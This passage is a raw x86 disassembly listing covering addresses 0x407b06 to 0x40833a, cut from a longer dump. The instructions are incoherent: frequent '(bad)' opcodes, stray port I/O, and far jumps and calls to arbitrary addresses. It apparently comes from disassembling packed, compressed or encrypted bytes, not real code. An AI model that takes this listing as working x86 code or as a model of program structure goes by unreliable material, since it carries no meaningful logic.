  407b06:	jo     0x407b83
  407b08:	fwait
  407b09:	loope  0x407b86
  407b0b:	jo     0x407b33
  407b0d:	inc    edi
  407b0e:	sub    DWORD PTR [edx],eax
  407b10:	and    al,0x3
  407b12:	dec    eax
  407b13:	fwait
  407b14:	lods   eax,DWORD PTR ds:[esi]
  407b15:	push   eax
  407b16:	adc    ebp,DWORD PTR [edi-0x54]
  407b19:	(bad)  
  407b1a:	ror    BYTE PTR [ecx-0x5ea3f658],0xf
  407b21:	adc    BYTE PTR [eax],ch
  407b23:	loope  0x407aff
  407b25:	out    0x11,eax
  407b27:	mov    al,ds:0xe9b3b259
  407b2c:	inc    ecx
  407b2d:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407b2f:	icebp  
  407b30:	cmp    al,0xff
  407b32:	sbb    BYTE PTR [ebp+0xaf39c10],bh
  407b38:	or     DWORD PTR [esi+0x26],edi
  407b3b:	push   ds
  407b3c:	xchg   esi,eax
  407b3d:	lahf   
  407b3e:	mov    bh,0xb1
  407b40:	enter  0x1dd0,0xbc
  407b44:	and    esp,esi
  407b46:	in     eax,0xbb
  407b48:	rcr    BYTE PTR ss:[esi-0x5c6ecb61],0xab
  407b50:	mov    edx,0x2fe0b8d3
  407b55:	ret    0xd6a7
  407b58:	push   eax
  407b59:	xor    DWORD PTR [edx+0x392006bf],esp
  407b5f:	frstor [ecx-0x22]
  407b62:	inc    edx
  407b63:	inc    eax
  407b64:	lea    ebp,fs:[eax-0x51]
  407b68:	pop    edi
  407b69:	pop    eax
  407b6a:	(bad)  
  407b6b:	ss jnp 0x407b61
  407b6e:	vmread esi,ebp
  407b71:	push   ecx
  407b72:	or     BYTE PTR [ebx+edx*2+0x4c8f584b],0x66
  407b7a:	jae    0x407b7e
  407b7c:	push   0x6ed2b9ba
  407b81:	pop    ss
  407b82:	data16 or BYTE PTR [esi-0x32],bl
  407b86:	and    DWORD PTR [ebp-0x72dbd2ce],esp
  407b8c:	adc    eax,0xb98a73f5
  407b91:	push   ebp
  407b92:	sub    ecx,DWORD PTR [ebx]
  407b94:	nop
  407b95:	sub    cl,BYTE PTR [esi]
  407b97:	ins    BYTE PTR es:[edi],dx
  407b98:	cdq    
  407b99:	icebp  
  407b9a:	outs   dx,DWORD PTR ds:[esi]
  407b9b:	aas    
  407b9c:	mov    esi,0xa119872b
  407ba1:	in     al,0xdf
  407ba3:	fwait
  407ba4:	xor    al,0x88
  407ba6:	xchg   ecx,eax
  407ba7:	mov    eax,0x7a5e6ff9
  407bac:	cmp    al,0x58
  407bae:	pop    ecx
  407baf:	cmc    
  407bb0:	mov    ecx,0x102f9f02
  407bb5:	icebp  
  407bb6:	jne    0x407b9b
  407bb8:	mov    ecx,0x744386c9
  407bbd:	(bad)  
  407bbe:	js     0x407b4a
  407bc0:	push   edx
  407bc1:	jmp    0x407b94
  407bc3:	stc    
  407bc4:	adc    DWORD PTR [ebx+0x4f],0x3a6bacca
  407bcb:	sub    BYTE PTR [edx+0xa],bh
  407bce:	add    al,0x3a
  407bd0:	inc    ecx
  407bd1:	repnz mov cl,BYTE PTR [ecx+0x72]
  407bd5:	ficomp WORD PTR [esi-0x759313eb]
  407bdb:	out    0xdd,eax
  407bdd:	test   eax,0xf57b58
  407be2:	scas   al,BYTE PTR es:[edi]
  407be3:	and    edx,edx
  407be5:	push   cs
  407be6:	imul   edx,DWORD PTR [edi],0xa245ed10
  407bec:	je     0x407b96
  407bee:	sti    
  407bef:	add    esp,DWORD PTR [esi+0x7a30a389]
  407bf5:	inc    eax
  407bf6:	adc    edi,0xffffff86
  407bf9:	in     eax,0xef
  407bfb:	xchg   ebp,eax
  407bfc:	aaa    
  407bfd:	rol    esi,0xe5
  407c00:	dec    eax
  407c01:	rcl    BYTE PTR [edx],1
  407c03:	add    eax,0x2a3e66e7
  407c08:	arpl   WORD PTR [ecx],sp
  407c0a:	or     dl,BYTE PTR [ebp+eiz*4+0x61]
  407c0e:	and    ah,bl
  407c10:	sub    BYTE PTR [esi+0x629be8ab],ah
  407c16:	push   DWORD PTR [eax+0x24]
  407c19:	mov    ebp,0x459ec4a2
  407c1e:	push   edx
  407c1f:	daa    
  407c20:	outs   dx,BYTE PTR ds:[esi]
  407c21:	daa    
  407c22:	outs   dx,BYTE PTR ds:[esi]
  407c23:	mov    bl,0xc8
  407c25:	or     BYTE PTR [eax-0x1f],0xe3
  407c29:	cld    
  407c2a:	push   ss
  407c2b:	add    ecx,eax
  407c2d:	mov    BYTE PTR [edx+ebx*2+0x779cf5fb],ch
  407c34:	or     al,0x23
  407c36:	mov    DWORD PTR [ebx-0x45489e68],0x9839adac
  407c40:	les    edx,FWORD PTR [ebp-0x1e7dc325]
  407c46:	xor    eax,0x3908df83
  407c4b:	and    BYTE PTR [esi+esi*2-0x551085b0],ch
  407c52:	push   cs
  407c53:	jno    0x407c72
  407c55:	call   0xb47f:0xaddb7faf
  407c5c:	xor    eax,0x3d631640
  407c61:	mov    ebp,0x5f540d14
  407c66:	(bad)  [eax+0x34011b3b]
  407c6c:	jb     0x407ca4
  407c6e:	sub    eax,0x9c277df
  407c73:	sbb    edi,DWORD PTR [edx-0x79]
  407c76:	(bad)  
  407c77:	(bad)  [edx+eax*1]
  407c7a:	xor    al,0xb3
  407c7c:	in     eax,0x21
  407c7e:	jae    0x407c2f
  407c80:	mov    cl,0xa8
  407c82:	push   ebp
  407c83:	data16 jl 0x407c69
  407c86:	jle    0x407c8b
  407c88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407c89:	lgs    edi,FWORD PTR [eax-0x63]
  407c8d:	cmp    bh,BYTE PTR [ecx+ecx*8-0x19b65785]
  407c94:	or     DWORD PTR [edx-0xd],ecx
  407c97:	mov    ah,0xd1
  407c99:	pop    edi
  407c9a:	imul   ecx,esi,0xd729334a
  407ca0:	push   esp
  407ca1:	out    dx,eax
  407ca2:	xor    eax,0x81353800
  407ca7:	pop    ds
  407ca8:	add    eax,0xb962ac16
  407cad:	add    al,ah
  407caf:	jl     0x407d02
  407cb1:	mov    ch,0xd7
  407cb3:	(bad)  
  407cb4:	pop    edi
  407cb5:	ss and al,0xef
  407cb8:	(bad)  
  407cba:	(bad)  
  407cbb:	mov    cl,0xb
  407cbd:	cld    
  407cbe:	test   ebp,ebx
  407cc0:	inc    esi
  407cc1:	push   esi
  407cc2:	inc    edx
  407cc3:	ins    DWORD PTR es:[edi],dx
  407cc4:	and    bh,BYTE PTR [eax+esi*4]
  407cc7:	mov    edi,0x40c9d9a2
  407ccc:	into   
  407ccd:	fnop   
  407ccf:	call   0x59dbf636
  407cd4:	mov    bl,0xe8
  407cd6:	lock fs jb 0x407d1a
  407cda:	out    dx,eax
  407cdb:	shl    esp,1
  407cdd:	xchg   edx,eax
  407cde:	cmp    eax,0x9ece7719
  407ce3:	lahf   
  407ce4:	mov    eax,ds:0x383645af
  407ce9:	aam    0x93
  407ceb:	sub    bh,BYTE PTR [ebp+0x5e1fe721]
  407cf1:	mov    edi,0xde0d4cea
  407cf6:	repz sahf 
  407cf8:	add    ecx,esi
  407cfa:	fdivr  st(7),st
  407cfc:	inc    eax
  407cfd:	je     0x407d27
  407cff:	fs mov edx,0x83ab20b2
  407d05:	cmp    BYTE PTR [esp+esi*8],bh
  407d08:	retf   0xdf13
  407d0b:	mov    eax,0x8eb4547e
  407d10:	cmc    
  407d11:	(bad)  
  407d12:	mov    dl,0x6a
  407d14:	pushf  
  407d15:	aaa    
  407d16:	mov    edi,0xc385b45b
  407d1b:	dec    ecx
  407d1c:	nop
  407d1d:	dec    DWORD PTR [eax+0x66]
  407d20:	aas    
  407d21:	mov    ah,0x58
  407d23:	pop    esi
  407d24:	xchg   esp,eax
  407d25:	xchg   esi,eax
  407d26:	cmp    DWORD PTR [ebx],edx
  407d28:	jae    0x407da1
  407d2a:	popa   
  407d2b:	into   
  407d2c:	popa   
  407d2d:	test   BYTE PTR [edx+0x12a1f17],dh
  407d33:	push   ecx
  407d34:	xor    esp,DWORD PTR [eax+eiz*8-0x73]
  407d38:	in     al,0xfc
  407d3a:	and    dh,al
  407d3c:	adc    ebx,eax
  407d3e:	mov    DWORD PTR [eax],ebp
  407d40:	mov    ebp,0x96cdec73
  407d45:	cld    
  407d46:	rcl    esi,0xa8
  407d49:	fcomp  QWORD PTR ds:0x1de0b551
  407d4f:	mov    eax,DWORD PTR [edi-0x49d4d415]
  407d55:	shr    BYTE PTR [edi-0x55],cl
  407d58:	sbb    edi,esp
  407d5a:	push   edi
  407d5b:	pop    ebp
  407d5c:	cmp    DWORD PTR [edi+0xe22d3b5],0xbb2e3875
  407d66:	jno    0x407d8a
  407d68:	ficomp WORD PTR [ebx-0x45ac0595]
  407d6e:	add    eax,0xfb5fb9e4
  407d73:	rol    BYTE PTR [eax-0x50],1
  407d76:	inc    ebx
  407d77:	sti    
  407d78:	sbb    eax,0x5e7db885
  407d7d:	imul   eax,DWORD PTR [ecx-0x625c3c61],0xb0d1bb81
  407d87:	nop
  407d88:	dec    esi
  407d89:	inc    eax
  407d8a:	sub    eax,0x1e02c27d
  407d8f:	shr    BYTE PTR [ebx],0x75
  407d92:	mov    ebx,0xf85181d6
  407d97:	ds adc eax,0x1dc097a0
  407d9d:	out    0xdf,al
  407d9f:	and    DWORD PTR ds:0x2fdf6582,0xf
  407da6:	or     DWORD PTR [eax+0x2d],eax
  407da9:	add    ebx,esp
  407dab:	jbe    0x407dc6
  407dad:	mov    ecx,0x61c90d9a
  407db2:	ins    DWORD PTR es:[edi],dx
  407db3:	aas    
  407db4:	sub    al,0xea
  407db6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407db7:	cs adc al,0xfe
  407dba:	test   al,0xc8
  407dbc:	mov    esi,DWORD PTR [ecx+0x35]
  407dbf:	ins    DWORD PTR es:[edi],dx
  407dc0:	lods   eax,DWORD PTR ds:[esi]
  407dc1:	mov    esi,0xcc0642ee
  407dc6:	jl     0x407d59
  407dc8:	dec    ecx
  407dc9:	arpl   bx,bx
  407dcb:	dec    esi
  407dcc:	(bad)  
  407dcd:	fdivr  DWORD PTR gs:[edx]
  407dd0:	push   eax
  407dd1:	ja     0x407deb
  407dd3:	adc    ah,BYTE PTR [ebp-0x3]
  407dd6:	xchg   DWORD PTR [ecx],eax
  407dd8:	hlt    
  407dd9:	enter  0xa70d,0x12
  407ddd:	lahf   
  407dde:	xchg   edi,eax
  407ddf:	call   0xe2a014e8
  407de4:	pop    ebp
  407de5:	adc    BYTE PTR [ecx-0x2a],al
  407de8:	leave  
  407de9:	xchg   edi,eax
  407dea:	sub    eax,0xe8004ba2
  407def:	scas   al,BYTE PTR es:[edi]
  407df0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407df1:	aam    0x77
  407df3:	lods   al,BYTE PTR ds:[esi]
  407df4:	xor    ebp,DWORD PTR [eax+0x46]
  407df7:	jle    0x407e26
  407df9:	jecxz  0x407e02
  407dfb:	and    ch,BYTE PTR [esi-0x2f94e964]
  407e01:	pushf  
  407e02:	mov    eax,ds:0xddcb043a
  407e07:	mov    ds:0x3d15ab11,al
  407e0c:	test   BYTE PTR [eax+0x18b2fe86],dl
  407e12:	mov    ch,0x62
  407e14:	in     eax,dx
  407e15:	mov    esi,0x65f89270
  407e1a:	mov    dl,0xd5
  407e1c:	adc    DWORD PTR [edx+0x1a126de4],edx
  407e22:	mov    al,ds:0xb5be37d4
  407e27:	and    eax,0x4fab9e6a
  407e2c:	icebp  
  407e2d:	aam    0xd7
  407e2f:	jge    0x407e7f
  407e31:	add    edx,edi
  407e33:	ret    0x1e70
  407e36:	sub    al,0x9
  407e38:	cmp    edx,ebx
  407e3a:	jb     0x407dcf
  407e3c:	repnz or BYTE PTR [ecx],cl
  407e3f:	(bad)  
  407e40:	retf   
  407e41:	sti    
  407e42:	mov    ds:0x17f06b9e,al
  407e47:	or     eax,0x5d81aadd
  407e4c:	cmp    al,0x7b
  407e4e:	sbb    DWORD PTR [esi+0x1e],0xdb1da81e
  407e55:	ja     0x407eb9
  407e57:	stos   BYTE PTR es:[edi],al
  407e58:	hlt    
  407e59:	ror    DWORD PTR [edx+0x73019596],0xd5
  407e60:	js     0x407e77
  407e62:	xchg   edx,eax
  407e63:	pusha  
  407e64:	inc    esi
  407e65:	data16 sub al,0x2
  407e68:	jl     0x407edd
  407e6a:	mov    esp,0xe3749b7a
  407e6f:	pop    es
  407e70:	(bad)  
  407e71:	jae    0x407e62
  407e73:	push   edx
  407e74:	and    BYTE PTR [ebx+ebx*1-0x18],bl
  407e78:	xor    ebp,DWORD PTR [ebx-0x7d]
  407e7b:	mov    bh,0x7f
  407e7d:	push   ebx
  407e7e:	and    al,0x82
  407e80:	ds push 0xfb02f3e8
  407e86:	jo     0x407e10
  407e88:	fld    TBYTE PTR [ecx]
  407e8a:	jmp    0x42c145ad
  407e8f:	stc    
  407e90:	pop    ecx
  407e91:	mov    al,cl
  407e93:	pop    esi
  407e94:	sahf   
  407e95:	outs   dx,DWORD PTR ds:[esi]
  407e96:	sub    al,0xaf
  407e98:	xor    eax,0x79089594
  407e9d:	add    esp,eax
  407e9f:	inc    ebp
  407ea0:	xchg   ecx,eax
  407ea1:	pop    eax
  407ea2:	mov    WORD PTR [ebx+edi*8+0x76],fs
  407ea6:	std    
  407ea7:	(bad)  
  407ea8:	js     0x407eaf
  407eaa:	sub    edi,DWORD PTR [edi+0x205bc22d]
  407eb0:	fwait
  407eb1:	cmc    
  407eb2:	dec    esp
  407eb3:	rcl    DWORD PTR [esi+0x5b0a28a9],1
  407eb9:	loop   0x407f12
  407ebb:	inc    ebx
  407ebc:	mov    edi,0x64ca725e
  407ec1:	aam    0x70
  407ec3:	pop    esi
  407ec4:	mov    cl,0xc1
  407ec6:	xchg   edi,eax
  407ec7:	adc    ah,BYTE PTR [edx+ecx*4]
  407eca:	adc    dl,BYTE PTR [edx+ebx*4-0x7e]
  407ece:	ror    BYTE PTR [ecx+ecx*4],cl
  407ed1:	cmp    eax,0x737e4c03
  407ed6:	jne    0x407f22
  407ed8:	dec    ebx
  407ed9:	jge    0x407f43
  407edb:	inc    edx
  407edc:	inc    ebx
  407edd:	pop    ss
  407ede:	das    
  407edf:	inc    edx
  407ee0:	mov    ch,0xee
  407ee2:	sub    dh,ah
  407ee4:	out    dx,eax
  407ee5:	xor    ecx,DWORD PTR [ebp+0x51db00ae]
  407eeb:	mov    ch,0x10
  407eed:	das    
  407eee:	popf   
  407eef:	fdiv   QWORD PTR [ebx+0x1154504e]
  407ef5:	cmp    al,BYTE PTR [edx-0x7a8712ed]
  407efb:	int3   
  407efc:	or     esi,DWORD PTR [ebx+0x77f55370]
  407f02:	loope  0x407f62
  407f04:	sub    esp,edx
  407f06:	ss add al,0xba
  407f09:	add    al,0xab
  407f0b:	sub    bl,BYTE PTR [ebp+0x28]
  407f0e:	inc    ebx
  407f0f:	cmp    cl,ch
  407f11:	fisub  DWORD PTR [eax-0x161fd01e]
  407f17:	daa    
  407f18:	in     eax,0x3b
  407f1a:	fcompp 
  407f1c:	dec    ebx
  407f1d:	fisub  DWORD PTR [edi+0x31]
  407f20:	push   ebx
  407f21:	frstor [edx]
  407f23:	sbb    BYTE PTR [ebp-0x609bb39c],0xc9
  407f2a:	pop    esi
  407f2b:	sub    BYTE PTR [edi+0x21e56ccd],bl
  407f31:	mov    ds:0xb565ed3f,eax
  407f36:	data16 jno 0x407efd
  407f39:	adc    eax,0xe2bf6311
  407f3e:	dec    ecx
  407f3f:	add    eax,DWORD PTR [esi]
  407f41:	clc    
  407f42:	push   ecx
  407f43:	jge    0x407fb7
  407f45:	rcr    DWORD PTR [ebp+eax*8+0x7e],1
  407f49:	mov    edx,0x48c50b8a
  407f4e:	sar    bh,1
  407f50:	cmp    BYTE PTR [esi-0x7],ch
  407f53:	rcr    DWORD PTR [esi+0x2b5c612],cl
  407f59:	mov    edi,0x47451b7f
  407f5e:	cli    
  407f5f:	mov    dh,0x1b
  407f61:	pop    ecx
  407f62:	jg     0x407fc5
  407f64:	push   ebp
  407f65:	pop    ebp
  407f66:	push   ebp
  407f67:	aam    0xb2
  407f69:	retf   0x11bd
  407f6c:	arpl   WORD PTR [edx-0x6f67e183],cx
  407f72:	fistp  DWORD PTR [edi+esi*2+0x47bf667c]
  407f79:	(bad)  
  407f7a:	jbe    0x407f46
  407f7c:	rcr    BYTE PTR [edx-0x4abdf9f1],cl
  407f82:	cs sahf 
  407f84:	push   edx
  407f85:	into   
  407f86:	pop    ebx
  407f87:	lods   al,BYTE PTR ds:[esi]
  407f88:	pop    ebx
  407f89:	dec    eax
  407f8a:	push   ebp
  407f8b:	je     0x408003
  407f8d:	inc    ecx
  407f8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407f8f:	jmp    0x98e49c84
  407f94:	sahf   
  407f95:	or     ch,BYTE PTR [eax+edi*4+0x39]
  407f99:	mov    esp,0x21cfb9dc
  407f9e:	call   0xe9faafe9
  407fa3:	cmp    DWORD PTR [ecx+ebp*8+0x9],esi
  407fa7:	pop    eax
  407fa8:	push   cs
  407fa9:	jg     0x407f91
  407fab:	add    eax,0xf1f15d04
  407fb0:	mov    ds:0x3e01e373,eax
  407fb5:	mov    ebx,eax
  407fb7:	or     esi,eax
  407fb9:	sar    DWORD PTR [esi+0x76392e95],0xdc
  407fc0:	in     eax,0x17
  407fc2:	or     al,0xe9
  407fc5:	icebp  
  407fc6:	fsub   QWORD PTR [edi+0x15]
  407fc9:	and    al,0x0
  407fcb:	adc    BYTE PTR [esi+0x6c2deb28],ah
  407fd1:	es add dh,dl
  407fd4:	icebp  
  407fd5:	mov    edi,0x616f9994
  407fda:	out    dx,eax
  407fdb:	xor    DWORD PTR ds:0x22b56d6e,esp
  407fe1:	jbe    0x407f6d
  407fe3:	ficom  WORD PTR [ebx-0x8]
  407fe6:	lahf   
  407fe7:	stos   DWORD PTR es:[edi],eax
  407fe8:	push   ebx
  407fe9:	sub    BYTE PTR [ebx-0x7c],dh
  407fec:	mov    ecx,0x69576bc3
  407ff1:	xchg   DWORD PTR [esi-0x3155a2d4],ebp
  407ff7:	push   ss
  407ff8:	xor    eax,0xe02ebb06
  407ffd:	cmp    BYTE PTR [esp+edi*1+0x74],dh
  408001:	imul   esp,DWORD PTR [edx-0x11],0x1a
  408005:	mov    esi,0xf3f4f20e
  40800a:	adc    esi,DWORD PTR [ecx+0x52ef0eba]
  408010:	pop    DWORD PTR [esi+ebp*1]
  408013:	ins    DWORD PTR es:[edi],dx
  408014:	fdivr  st,st(0)
  408016:	xor    al,0x65
  408018:	mov    esp,0xcb36f082
  40801d:	leave  
  40801e:	sbb    bl,BYTE PTR [ebp-0x7a]
  408021:	es repnz mov bl,0xad
  408025:	inc    esp
  408026:	push   edi
  408027:	mov    ebp,DWORD PTR [esi+0x71]
  40802a:	cmp    esp,DWORD PTR [edi+0x379cfd09]
  408030:	leave  
  408031:	jecxz  0x40800d
  408033:	loope  0x408067
  408035:	or     BYTE PTR [ebx-0x4ab8cac9],bh
  40803b:	imul   ebx,DWORD PTR [edx-0x7275444d],0xc069676f
  408045:	add    dh,BYTE PTR ds:0x3888f550
  40804b:	popf   
  40804c:	icebp  
  40804d:	ror    DWORD PTR [edx+0x267107c8],1
  408053:	dec    ebp
  408054:	xchg   ebx,eax
  408055:	shr    DWORD PTR [edx+0x4a],1
  408058:	outs   dx,BYTE PTR ds:[esi]
  408059:	xlat   BYTE PTR ds:[ebx]
  40805a:	jnp    0x408040
  40805c:	lea    ecx,[ebx]
  40805e:	lods   al,BYTE PTR ds:[esi]
  40805f:	ret    0x8547
  408062:	lahf   
  408063:	pop    es
  408064:	call   0xe29dfff
  408069:	icebp  
  40806a:	jl     0x408051
  40806c:	neg    bh
  40806e:	dec    ebp
  40806f:	pop    ecx
  408070:	shl    DWORD PTR [edi-0x44],1
  408073:	out    dx,eax
  408074:	repz jns 0x408041
  408077:	and    bh,BYTE PTR [eiz*2-0x4d7b5683]
  40807e:	stos   BYTE PTR es:[edi],al
  40807f:	push   esi
  408080:	xchg   ebx,eax
  408081:	test   eax,0xf715d7b
  408086:	add    ebp,edi
  408088:	mov    ebx,0xa8829ddb
  40808d:	fwait
  40808e:	pop    ebx
  40808f:	in     eax,dx
  408090:	test   BYTE PTR [eax+0x1e3980e2],0x6f
  408097:	fwait
  408098:	or     ecx,DWORD PTR [eax-0x4b11d769]
  40809e:	sub    BYTE PTR [ebp-0x5f],dl
  4080a1:	lock gs call 0x6bd5:0x32c188e7
  4080aa:	adc    al,BYTE PTR [ecx-0x6cc15292]
  4080b0:	push   ss
  4080b1:	ret    0xeba3
  4080b4:	out    0x25,al
  4080b6:	xor    DWORD PTR [edx+0x5f],0x30
  4080ba:	in     al,0xe8
  4080bc:	sti    
  4080bd:	lock mov ds:0x3db13c7c,eax
  4080c3:	sbb    edi,0xffffffd0
  4080c6:	sti    
  4080c7:	sbb    DWORD PTR [eax-0x14],ebp
  4080ca:	or     dl,BYTE PTR [ebx+0x4cca8d87]
  4080d0:	lock mov eax,ds:0x67c9234c
  4080d6:	sub    eax,0xa4984118
  4080db:	add    al,0x91
  4080dd:	fcmovu st,st(4)
  4080df:	call   0xdaf2:0x854c6ecf
  4080e6:	lea    esi,[edi-0x286f24fb]
  4080ec:	push   edx
  4080ed:	dec    ebp
  4080ee:	xchg   ecx,eax
  4080ef:	mov    ah,0x95
  4080f1:	rcl    BYTE PTR [esi+0x9],cl
  4080f4:	sbb    ah,cl
  4080f6:	scas   al,BYTE PTR es:[edi]
  4080f7:	aam    0x9a
  4080f9:	rol    BYTE PTR [esp+esi*2+0x1a0c152c],1
  408100:	sub    DWORD PTR [eax],eax
  408102:	loopne 0x4080b4
  408104:	shl    DWORD PTR [esi],1
  408106:	out    dx,eax
  408107:	mov    ch,0x78
  408109:	aas    
  40810a:	xor    eax,DWORD PTR [eax-0x6e]
  40810d:	jo     0x408118
  40810f:	fiadd  DWORD PTR [ecx]
  408111:	sbb    al,0x6c
  408113:	pop    eax
  408114:	repz ja 0x408150
  408117:	sub    DWORD PTR [eax+0x2ff5175c],0x6fe45b7c
  408121:	sbb    ebx,eax
  408123:	pop    esp
  408124:	jmp    0x8e39a4a4
  408129:	(bad)  
  40812b:	cmp    cl,BYTE PTR [ecx]
  40812d:	aaa    
  40812e:	adc    cl,dh
  408130:	imul   ebp,edx,0xc518ceb0
  408136:	xchg   edx,eax
  408137:	stos   BYTE PTR es:[edi],al
  408138:	xor    BYTE PTR [eax+eax*4+0x6e],al
  40813c:	cli    
  40813d:	or     edx,DWORD PTR [esi+0x57]
  408140:	paddq  mm5,QWORD PTR [eax+0x31]
  408144:	xor    dl,bl
  408146:	sbb    BYTE PTR [edi*8-0x38f36574],ch
  40814d:	stos   BYTE PTR es:[edi],al
  40814e:	mov    dl,0x5c
  408150:	faddp  st(1),st
  408152:	and    BYTE PTR [esi],ah
  408154:	(bad)  
  408156:	jmp    0x408159
  408158:	shr    BYTE PTR [eax+0x5b],cl
  40815b:	xor    eax,0x68cd34a8
  408160:	test   al,0xdf
  408162:	test   eax,0x97f0187b
  408167:	nop
  408168:	mov    gs,WORD PTR [eax-0x642e970c]
  40816e:	or     dl,BYTE PTR [edx]
  408170:	je     0x408177
  408172:	mov    dh,0x38
  408174:	cmc    
  408175:	adc    edi,eax
  408177:	inc    ebp
  408178:	push   edi
  408179:	test   DWORD PTR [ebp+0x1d21168b],0x496bd2fd
  408183:	inc    edx
  408184:	ins    DWORD PTR es:[edi],dx
  408185:	push   ecx
  408186:	loop   0x4081bb
  408188:	cmps   BYTE PTR ds:[si],BYTE PTR es:[di]
  40818a:	sbb    bh,bl
  40818c:	inc    esp
  40818d:	pop    edx
  40818e:	outs   dx,BYTE PTR ds:[esi]
  40818f:	loope  0x4081f5
  408191:	push   ds
  408192:	sbb    esp,DWORD PTR [ebx+0x5bd68746]
  408198:	cmp    ah,BYTE PTR [ebx-0x77]
  40819b:	les    ebx,FWORD PTR [eax+0x1f6aba35]
  4081a1:	dec    edx
  4081a2:	and    ch,BYTE PTR [ebx+0x3b]
  4081a5:	rcr    al,0xe2
  4081a8:	cmp    eax,0xe73cfb62
  4081ad:	repz sub ecx,edx
  4081b0:	aas    
  4081b1:	test   eax,0xb7562fa5
  4081b6:	(bad)  
  4081b7:	rcr    BYTE PTR [ebp+ebp*1-0x21],0x33
  4081bc:	mov    WORD PTR [ebp+0x5f],?
  4081bf:	std    
  4081c0:	sbb    BYTE PTR [ebx+eax*4+0x4c03d9f7],bl
  4081c7:	test   eax,0xc50c60af
  4081cc:	js     0x408191
  4081ce:	retf   0x4f6f
  4081d1:	mov    eax,ds:0xf9a5c98a
  4081d6:	xchg   edi,eax
  4081d7:	mul    ecx
  4081d9:	outs   dx,BYTE PTR ds:[esi]
  4081da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4081db:	inc    esi
  4081dc:	pop    ebp
  4081dd:	add    bh,BYTE PTR [esi]
  4081df:	int3   
  4081e0:	sbb    bl,BYTE PTR [ecx]
  4081e2:	dec    ebx
  4081e3:	mov    al,ds:0x60aaff7b
  4081e8:	inc    edx
  4081e9:	pop    ecx
  4081ea:	xchg   ebp,eax
  4081eb:	dec    edi
  4081ec:	nop
  4081ed:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4081ee:	jbe    0x4081d6
  4081f0:	sti    
  4081f1:	jne    0x4081c2
  4081f3:	out    dx,eax
  4081f4:	pop    ebx
  4081f5:	enter  0x2783,0xf2
  4081f9:	mov    eax,0xc5050785
  4081fe:	div    DWORD PTR [ebx+0x26]
  408201:	jl     0x4081a0
  408203:	out    0xe1,eax
  408205:	aad    0xdd
  408207:	xor    BYTE PTR [esi],ch
  408209:	fiadd  WORD PTR [edi]
  40820b:	mov    edi,0x302a6077
  408210:	pop    ebx
  408211:	dec    esi
  408212:	mov    ?,WORD PTR [edi+0x39a46048]
  408218:	push   ss
  408219:	mov    edx,DWORD PTR [eax]
  40821b:	add    esp,ebx
  40821d:	sbb    eax,0xf815c321
  408222:	inc    eax
  408223:	mov    esi,DWORD PTR [ebx]
  408225:	ret    
  408226:	jmp    0xcd20:0x8678e683
  40822d:	ret    0xac6d
  408230:	adc    al,0x29
  408232:	fnsave [esp+esi*1-0x5c70a883]
  408239:	dec    ecx
  40823a:	push   ebx
  40823b:	mov    DWORD PTR [esi],ecx
  40823d:	jne    0x4081ea
  40823f:	sub    BYTE PTR [eax-0x7fa7de88],bh
  408245:	mov    ebx,DWORD PTR [eax]
  408247:	fs mov cx,0xe077
  40824c:	jmp    0x139b9950
  408251:	xchg   ecx,eax
  408252:	adc    al,0xcd
  408254:	mov    ds:0x981b3de,eax
  408259:	(bad)  
  40825a:	int3   
  40825b:	add    al,0xc3
  40825d:	test   BYTE PTR [edx+edi*1],bl
  408260:	aas    
  408261:	sub    dh,BYTE PTR [ebp+0x1648983c]
  408267:	retf   0xe0a2
  40826a:	add    al,0xed
  40826c:	leave  
  40826d:	mov    esi,0xf9245027
  408272:	inc    eax
  408273:	mov    BYTE PTR [edx-0x6930aa04],ah
  408279:	and    bh,BYTE PTR [edi+0x72]
  40827c:	ud1    edx,DWORD PTR [edx+0x74]
  408280:	mov    cl,0x82
  408282:	adc    BYTE PTR [eax-0x60583f3c],ah
  408288:	test   dh,cl
  40828a:	and    DWORD PTR [edi-0x5cd63a30],edi
  408290:	mov    WORD PTR [eax+edx*4],gs
  408293:	adc    bh,al
  408295:	mov    ebx,0x18b59637
  40829a:	pop    ebx
  40829b:	retf   0x313b
  40829e:	outs   dx,DWORD PTR ds:[esi]
  40829f:	test   eax,0x22df364d
  4082a4:	jmp    0xc5173c2a
  4082a9:	mov    ds,edx
  4082ab:	retf   0x2ef9
  4082ae:	sahf   
  4082af:	add    ebp,ecx
  4082b1:	cmp    al,0x32
  4082b3:	mov    ebp,edx
  4082b5:	sub    al,0x4a
  4082b7:	fisub  DWORD PTR [ebx+eax*1-0x4f27f3d2]
  4082be:	mov    ebx,0x736229d4
  4082c3:	pop    edx
  4082c4:	int3   
  4082c5:	cmp    al,0x11
  4082c7:	lea    ebx,[ebx-0x5d783d2]
  4082cd:	jno    0x4082f9
  4082cf:	mov    ecx,DWORD PTR [ecx+0x6d387195]
  4082d5:	adc    DWORD PTR ds:0x5e78dd19,edx
  4082db:	ja     0x408327
  4082dd:	js     0x4082ca
  4082df:	mov    ss,WORD PTR [edi+ebp*2-0x16]
  4082e3:	mov    eax,ds:0x5d7cfaa
  4082e8:	sbb    al,0x39
  4082ea:	mov    ?,WORD PTR [eiz*8-0x23e42ebe]
  4082f1:	mov    dl,0x78
  4082f3:	xor    ch,BYTE PTR [eax-0x74408c40]
  4082f9:	push   ecx
  4082fa:	lds    edx,FWORD PTR [edx-0x64]
  4082fd:	jecxz  0x408316
  4082ff:	mov    eax,0x11d9f9df
  408304:	fidiv  DWORD PTR [eax+ebp*8-0x3]
  408308:	and    BYTE PTR [eax+eax*1],cl
  40830b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40830c:	mov    cl,0x12
  40830e:	push   es
  40830f:	xchg   ebx,eax
  408310:	xchg   ecx,eax
  408311:	(bad)  
  408312:	jecxz  0x408359
  408314:	ret    
  408315:	rcl    BYTE PTR [ebp-0x5ec4334c],0x9
  40831c:	or     dl,dl
  40831e:	mov    ch,0xae
  408320:	or     BYTE PTR [edi],ch
  408322:	jo     0x4082e1
  408324:	sar    BYTE PTR ds:0x45524997,1
  40832a:	pop    esi
  40832b:	rol    esi,0x0
  40832e:	jmp    0x830dec0
  408333:	jmp    0x25223456
  408338:	cmp    al,0xc5
  40833a:	clc    
